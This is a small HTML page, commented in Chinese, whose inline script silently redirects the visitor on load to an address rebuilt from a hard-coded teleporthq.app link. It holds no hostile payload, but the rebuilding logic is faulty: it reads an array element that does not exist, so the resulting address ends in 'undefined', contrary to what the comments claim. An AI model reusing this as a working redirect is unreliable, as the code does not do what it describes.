<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>自动跳转页面</title>
</head>
<body>
	<script>
		var url = 'https://healthy-great-lobster-jdmca2.teleporthq.app/';
		var urlParts = url.split('/'); // 将URL按照'/'分割成数组
		var newUrl = 'https://' + urlParts[2] + '/' + urlParts[3] + '/' + urlParts[4]; // 拼接新的URL
		window.location.href = newUrl; // 自动跳转到新的URL
	</script>
</body>
</html>
